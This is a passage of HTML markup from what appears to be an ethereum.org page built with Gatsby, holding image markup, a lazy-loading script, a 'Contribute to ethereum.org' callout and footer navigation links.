Ys9Yg7vBNP3lHisb/ONMFxqsr3VNiCo7o4JtUFTBgfpFFosr3Ca9OOdYRbD3gAu+cPo3DhAj3UX/RY37r/YxQkTi3bbPjLM1hQAd1zcJkBLd1wBZxDmVqLgopbPxRjPUGzFRXBuRsmvMcrQkptILy4RpNNLzK7uEKxjldiZ2SH4tRdEnHERKZdbGbYzfSM35t8z9y0A/NIVhQu/xRTLQVlx5PYD5n2Ape3jJ+B5g6IXsLIM+nIcGGQBM8dxJPImV1uH+l2j5IbzbTtQV/A/VqX8NdBegkAAAAAASUVORK5CYII="
                                alt="" />
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  data-srcset="/static/bf78b49d7e23b88a7eea934225b0cf96/0a996/enterprise-eth.webp 320w,/static/bf78b49d7e23b88a7eea934225b0cf96/c310c/enterprise-eth.webp 640w"
                                  sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="320px" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/612d13fc380ed83aa9631a5bc4da34d72385e24b/d42b7/static/bf78b49d7e23b88a7eea934225b0cf96/9f003/enterprise-eth.png"
                                  data-srcset="https://d33wubrfki0l68.cloudfront.net/612d13fc380ed83aa9631a5bc4da34d72385e24b/d42b7/static/bf78b49d7e23b88a7eea934225b0cf96/9f003/enterprise-eth.png 320w,https://d33wubrfki0l68.cloudfront.net/7270c773812d67ae6fc42daa20a169425be12dd3/03eab/static/bf78b49d7e23b88a7eea934225b0cf96/2ccad/enterprise-eth.png 640w"
                                  alt="Illustration of a group of builders working together." />
                              </picture><noscript>
                                <picture>
                                  <img class = 'handsome' type="image/webp"
                                    srcSet="/static/bf78b49d7e23b88a7eea934225b0cf96/0a996/enterprise-eth.webp 320w,/static/bf78b49d7e23b88a7eea934225b0cf96/c310c/enterprise-eth.webp 640w"
                                    sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                    sizes="320px" decoding="async" loading="lazy"
                                    src="https://d33wubrfki0l68.cloudfront.net/612d13fc380ed83aa9631a5bc4da34d72385e24b/d42b7/static/bf78b49d7e23b88a7eea934225b0cf96/9f003/enterprise-eth.png"
                                    srcSet="https://d33wubrfki0l68.cloudfront.net/612d13fc380ed83aa9631a5bc4da34d72385e24b/d42b7/static/bf78b49d7e23b88a7eea934225b0cf96/9f003/enterprise-eth.png 320w,https://d33wubrfki0l68.cloudfront.net/7270c773812d67ae6fc42daa20a169425be12dd3/03eab/static/bf78b49d7e23b88a7eea934225b0cf96/2ccad/enterprise-eth.png 640w"
                                    alt="Illustration of a group of builders working together." />
                                </picture>
                              </noscript>
                              <script
                                type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                            </div>
                          </div>
                          <div class="ActionCard__Content-sc-gy4g5e-0 fOVdDV action-card-content">
                            <h3 class="ActionCard__Title-sc-gy4g5e-4 gtOVKq">The Ethereum community</h3>
                            <p class="ActionCard__Description-sc-gy4g5e-1 kEexQS">Ethereum is all about community. It&#x27;s
                              made up of people from all different backgrounds and interests. See how you can join in.</p>
                          </div>
                        </a></div>
                      <div
                        class="CalloutBanner__StyledCard-sc-gj8rbv-0 HCTlz pages__StyledCalloutBanner-sc-179z7qu-33 hYJHgM">
                        <div data-gatsby-image-wrapper=""
                          class="gatsby-image-wrapper gatsby-image-wrapper-constrained CalloutBanner__Image-sc-gj8rbv-3 eugKcz">
                          <div style="max-width:600px;display:block"><img alt="" role="presentation" aria-hidden="true"
                              src="data:image/svg+xml;charset=utf-8,%3Csvg height=&#x27;613&#x27; width=&#x27;600&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; version=&#x27;1.1&#x27;%3E%3C/svg%3E"
                              style="max-width:100%;display:block;position:static" /></div><img aria-hidden="true"
                            data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAD2EAAA9hAHVrK90AAAFHElEQVQ4y51Ua0yTVxh+vvJvatRsycyyC9kWHXFKRWCAqCiUQgttv68XCrXlfhcEpFIus9ACcuuFshYQ2YQFRA04BTEO5WYVvOF06lymJotzy1yy7MeWTEHOTkui2R+T7SRvzsn5vvO8z/u+z/sCr1iF7CcvTJ8Q9uL8v5aqeDcI3U9QY8evIeNHgnJFCQwJeujT6v87YLlrAMVPCLIJgWJ6Bl23CKwxKpi0VajObkBJSs2rASZbWGz190VFUhAGjSL0lYTAVJbGaypV4VNDsqhxt/b0ARvwJuWtTzZioDKGOWUS406XGt8dSoRky9qXYF83SDw/oCY5FONNMt4QBZyrD8XZUTNv8mwOSizmSUNOMSnW2vX7UrphKmj3OWmSgLhLcb5Jyky1yOC2sli3joIe1kfB46mvXAi3jfOCH6kQvn6oRr3S2GNBoaM5Pr2m4S+BqIiUZTqIOc8R1VbagSOV7PuPB7Iw5iFTEc30lwvgKtgOCIM/QPfeSBCaq28PJngAY+92a1rr7j3EHpd9e56t+TdxWgUJjSh5pk00kwOFHb/gLduy251SgdsmN+VL+Ss0kX5ozdvGVCYFAn6+a/CoT8d7ciwF5xql2698phybrI2OkticHxW02OfjDaUkNC19IVydS8Jy0uZzs+uIMdM5iFXwGWuUdl6wcocJOUMJnUABtxm42aFivu9OxIPDmlU05EMzDuVRmAhSaxqaVTlWEp/S8GxHZj4Jz0klgnT9czbDQTJ0FiIKrnr3fg+7ZaKZnaUpC/Sk7lhVDA+TzTJmvEmKM3Xx7820yo9dsHEZ9zvVWA5/H06S3KHQGAmb6lyQplqfczo74ZQFv+4UJoU5yrUYt6jWXHMqR07XirPI/QqQp00MZlvlPGq4aJdHzDoUPdMtnGAoS41KPhfkiJT8Wc1uW9yl0C7KlXsWi5QxCxZRNKkNlNqcAg4j5fLllx3yrmGTuJyKhfFK5k5XIu9hzy7caE8Iu31QPTVsigs7ZZRCGx6yospfedURpiGO+Nh5qyJysUOgfF4fkETyPxYpSwJEMCduW0llUz/rkFvID5ThH/UMaJjMdafSI5kgerZ/VSMSvI1AXu5aEXb7CzcY+cqnBzYnkZZgzVMTX00MfFlbwWtJeDSsxESzLOiEMdZI971kIg/kehEooAKXlmwVBe5w29gBqq2dV3vFyF+tRhlfmle9SUHMASqyfxM3p9m5adkXRbG4d1C77Eqbwn7JLj9+uU0R4tEwNR4N2gc/9Wl5P/frKKg8hdIfmXOpBvsM0RumXfHYvzoVBn/ZwH6+nOSuj/VrYeO8mr1o5ypvtKuGh4yxewgZ895lijcutZ6n7TxrYawQN1yq0os27hS1oakWVug2JcGwNcbXEBKnfAcc+vWiNbc6E3oom/OjdXHWzqIdbxRyAXAWRiwVpbcs2ts+tIeZaQvruWJo1fMuWNmuiRZZz7SFM47UiTPdLkncWIO07pt21RztXfeUhbW4CiP85lxKXHcqmPnRTDRlbV1iSD96Eoxhs5jZqwzy0u/dF8W/ZOciqZR0Z2olHwKbmZM1Igl1HkNzF3D3c+3yYXMcHvfreGQyn74ZAHXwcuLc7EjAWKMEo3XxDCGj+LIsChQQV9sUXme0mhihADQV3vubXTrPyOM9G80Cua2HJmr9v+dh+EZf0HygWkfnYEoojlcJeTOtnM+0RcZMUTtaKQQtAHOuUcLQMHkPerX4eyQbvw+mw5AY/ALnH3RPUuUVwZl0AAAAAElFTkSuQmCC"
                            alt="" />
                          <picture>
                            <img class = 'handsome' type="image/webp"
                              data-srcset="/static/0453c88b09ddaa2c7e7552840c650ad2/bf72e/finance_transparent.webp 150w,/static/0453c88b09ddaa2c7e7552840c650ad2/514a5/finance_transparent.webp 300w,/static/0453c88b09ddaa2c7e7552840c650ad2/82fa5/finance_transparent.webp 600w,/static/0453c88b09ddaa2c7e7552840c650ad2/1f265/finance_transparent.webp 1200w"
                              sizes="(min-width: 600px) 600px, 100vw" /><img data-gatsby-image-ssr="" maxImageWidth="600"
                              data-main-image="" style="opacity:1" sizes="(min-width: 600px) 600px, 100vw" decoding="async"
                              loading="lazy"
                              src="https://d33wubrfki0l68.cloudfront.net/53ae5924689de89736d96b502e05804d80817b5c/a1ff5/static/0453c88b09ddaa2c7e7552840c650ad2/d5f3a/finance_transparent.png"
                              data-srcset="https://d33wubrfki0l68.cloudfront.net/0f80fce2157501cccf527853ab8e893e70182d10/c46bd/static/0453c88b09ddaa2c7e7552840c650ad2/7abed/finance_transparent.png 150w,https://d33wubrfki0l68.cloudfront.net/d1d07d010a13ad4b9a71550ebc10c66aff97f716/59fba/static/0453c88b09ddaa2c7e7552840c650ad2/30dff/finance_transparent.png 300w,https://d33wubrfki0l68.cloudfront.net/53ae5924689de89736d96b502e05804d80817b5c/a1ff5/static/0453c88b09ddaa2c7e7552840c650ad2/d5f3a/finance_transparent.png 600w,https://d33wubrfki0l68.cloudfront.net/7f38ba8344fc15e493529308fe23f5426b5cfd9b/0f8eb/static/0453c88b09ddaa2c7e7552840c650ad2/2bae5/finance_transparent.png 1200w"
                              alt="An Ethereum logo made of lego bricks." />
                          </picture><noscript>
                            <picture>
                              <img class = 'handsome' type="image/webp"
                                srcSet="/static/0453c88b09ddaa2c7e7552840c650ad2/bf72e/finance_transparent.webp 150w,/static/0453c88b09ddaa2c7e7552840c650ad2/514a5/finance_transparent.webp 300w,/static/0453c88b09ddaa2c7e7552840c650ad2/82fa5/finance_transparent.webp 600w,/static/0453c88b09ddaa2c7e7552840c650ad2/1f265/finance_transparent.webp 1200w"
                                sizes="(min-width: 600px) 600px, 100vw" /><img data-gatsby-image-ssr="" maxImageWidth="600"
                                data-main-image="" style="opacity:1" sizes="(min-width: 600px) 600px, 100vw"
                                decoding="async" loading="lazy"
                                src="https://d33wubrfki0l68.cloudfront.net/53ae5924689de89736d96b502e05804d80817b5c/a1ff5/static/0453c88b09ddaa2c7e7552840c650ad2/d5f3a/finance_transparent.png"
                                srcSet="https://d33wubrfki0l68.cloudfront.net/0f80fce2157501cccf527853ab8e893e70182d10/c46bd/static/0453c88b09ddaa2c7e7552840c650ad2/7abed/finance_transparent.png 150w,https://d33wubrfki0l68.cloudfront.net/d1d07d010a13ad4b9a71550ebc10c66aff97f716/59fba/static/0453c88b09ddaa2c7e7552840c650ad2/30dff/finance_transparent.png 300w,https://d33wubrfki0l68.cloudfront.net/53ae5924689de89736d96b502e05804d80817b5c/a1ff5/static/0453c88b09ddaa2c7e7552840c650ad2/d5f3a/finance_transparent.png 600w,https://d33wubrfki0l68.cloudfront.net/7f38ba8344fc15e493529308fe23f5426b5cfd9b/0f8eb/static/0453c88b09ddaa2c7e7552840c650ad2/2bae5/finance_transparent.png 1200w"
                                alt="An Ethereum logo made of lego bricks." />
                            </picture>
                          </noscript>
                          <script
                            type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                        </div>
                        <div class="CalloutBanner__Content-sc-gj8rbv-1 hatxbg">
                          <h2 class="CalloutBanner__H2-sc-gj8rbv-4 gvPciB"><span>Contribute to ethereum.org</span></h2>
                          <p class="CalloutBanner__Description-sc-gj8rbv-2 ilbaeg"><span>This website is open source with
                              hundreds of community contributors. You can propose edits to any of the content on this site,
                              suggest awesome new features, or help us squash bugs.</span></p>
                          <div class="pages__ButtonRow-sc-179z7qu-5 gIRrJM"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__PrimaryLink-sc-8betkf-2 iMiHPL eClriT"
                              href="/en/contributing/"><span>More on contributing</span></a><a
                              class="ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__SecondaryLink-sc-8betkf-3 iMiHPL fWQsqc pages__StyledButtonLink-sc-179z7qu-6 jUwQBm"
                              href="https://github.com/ethereum/ethereum-org-website" target="_blank"
                              rel="noopener noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
                                viewBox="0 0 496 512"
                                class="Icon__StyledIcon-sc-1o8zi5s-0 pages__StyledIcon-sc-179z7qu-29 ilAeZt iUTeOT"
                                height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                                <path
                                  d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z">
                                </path>
                              </svg> GitHub</a></div>
                        </div>
                      </div>
                    </div>
                  </div>
                </main>
              </div>
            </div>
            <footer class="Footer__StyledFooter-sc-1to993d-0 gvoBKJ">
              <div class="Footer__FooterTop-sc-1to993d-1 kFKfdz">
                <div class="Footer__LastUpdated-sc-1to993d-2 dixOFq"><span>Website last updated</span>:
                  <!-- -->
                  <!-- -->March 8, 2022
                </div>
                <div class="Footer__SocialIcons-sc-1to993d-9 kdLbod"><a
                    href="https://github.com/ethereum/ethereum-org-website" target="_blank" rel="noopener noreferrer"
                    aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
                      viewBox="0 0 496 512"
                      class="Icon__StyledIcon-sc-1o8zi5s-0 Footer__SocialIcon-sc-1to993d-10 ilAeZt iedzfy" height="36"
                      width="36" xmlns="http://www.w3.org/2000/svg">
                      <path
                        d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z">
                      </path>
                    </svg></a><a href="https://twitter.com/ethdotorg" target="_blank" rel="noopener noreferrer"
                    aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
                      viewBox="0 0 512 512"
                      class="Icon__StyledIcon-sc-1o8zi5s-0 Footer__SocialIcon-sc-1to993d-10 ilAeZt iedzfy" height="36"
                      width="36" xmlns="http://www.w3.org/2000/svg">
                      <path
                        d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
                      </path>
                    </svg></a><a href="https://youtube.com/channel/UCNOfzGXD_C9YMYmnefmPH0g" target="_blank"
                    rel="noopener noreferrer" aria-label="Youtube"><svg stroke="currentColor" fill="currentColor"
                      stroke-width="0" viewBox="0 0 576 512"
                      class="Icon__StyledIcon-sc-1o8zi5s-0 Footer__SocialIcon-sc-1to993d-10 ilAeZt iedzfy" height="36"
                      width="36" xmlns="http://www.w3.org/2000/svg">
                      <path
                        d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z">
                      </path>
                    </svg></a><a href="https://discord.gg/CetY6Y4" target="_blank" rel="noopener noreferrer"
                    aria-label="Discord"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
                      viewBox="0 0 640 512"
                      class="Icon__StyledIcon-sc-1o8zi5s-0 Footer__SocialIcon-sc-1to993d-10 ilAeZt iedzfy" height="36"
                      width="36" xmlns="http://www.w3.org/2000/svg">
                      <path
                        d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z">
                      </path>
                    </svg></a></div>
              </div>
              <div class="Footer__LinkGrid-sc-1to993d-3 hlbLsM">
                <div class="Footer__LinkSection-sc-1to993d-4 bfxkfK">
                  <h3 class="Footer__SectionHeader-sc-1to993d-5 bbCEKr"><span>Use Ethereum</span></h3>
                  <ul class="Footer__List-sc-1to993d-6 gjQPMc">
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/wallets/"><span>Ethereum wallets</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/get-eth/"><span>Get ETH</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/dapps/"><span>Decentralized applications (dapps)</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/run-a-node/"><span>Run a node</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/stablecoins/"><span>Stablecoins</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/staking/"><span>Stake ETH</span></a></li>
                  </ul>
                </div>
                <div class="Footer__LinkSection-sc-1to993d-4 bfxkfK">
                  <h3 class="Footer__SectionHeader-sc-1to993d-5 bbCEKr"><span>Learn</span></h3>
                  <ul class="Footer__List-sc-1to993d-6 gjQPMc">
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/"><span>What is Ethereum?</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/eth/"><span>What is ether (ETH)?</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/learn/"><span>Community guides and resources</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/history/"><span>History of Ethereum</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/whitepaper/"><span>Ethereum Whitepaper</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/upgrades/"><span>Ethereum upgrades</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/security/"><span>Ethereum security and scam prevention</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos is-glossary Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/glossary/"><span>Ethereum glossary</span><svg stroke="currentColor" fill="currentColor"
                          stroke-width="0" viewBox="0 0 16 16"
                          class="Icon__StyledIcon-sc-1o8zi5s-0 Link__GlossaryIcon-sc-e3riao-3 ilAeZt fCuHsG" height="12px"
                          width="12px" xmlns="http://www.w3.org/2000/svg">
                          <path
                            d="M2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2zm3.496 6.033a.237.237 0 0 1-.24-.247C5.35 4.091 6.737 3.5 8.005 3.5c1.396 0 2.672.73 2.672 2.24 0 1.08-.635 1.594-1.244 2.057-.737.559-1.01.768-1.01 1.486v.105a.25.25 0 0 1-.25.25h-.81a.25.25 0 0 1-.25-.246l-.004-.217c-.038-.927.495-1.498 1.168-1.987.59-.444.965-.736.965-1.371 0-.825-.628-1.168-1.314-1.168-.803 0-1.253.478-1.342 1.134-.018.137-.128.25-.266.25h-.825zm2.325 6.443c-.584 0-1.009-.394-1.009-.927 0-.552.425-.94 1.01-.94.609 0 1.028.388 1.028.94 0 .533-.42.927-1.029.927z">
                          </path>
                        </svg></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/governance/"><span>Ethereum governance</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/bridges/"><span>Blockchain bridges</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/energy-consumption/"><span>Ethereum energy consumption</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/eips/"><span>Ethereum Improvement Proposals</span></a></li>
                  </ul>
                </div>
                <div class="Footer__LinkSection-sc-1to993d-4 bfxkfK">
                  <h3 class="Footer__SectionHeader-sc-1to993d-5 bbCEKr"><span>Developers</span></h3>
                  <ul class="Footer__List-sc-1to993d-6 gjQPMc">
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/developers/"><span>Get started</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/developers/docs/"><span>Documentation</span></a></li>
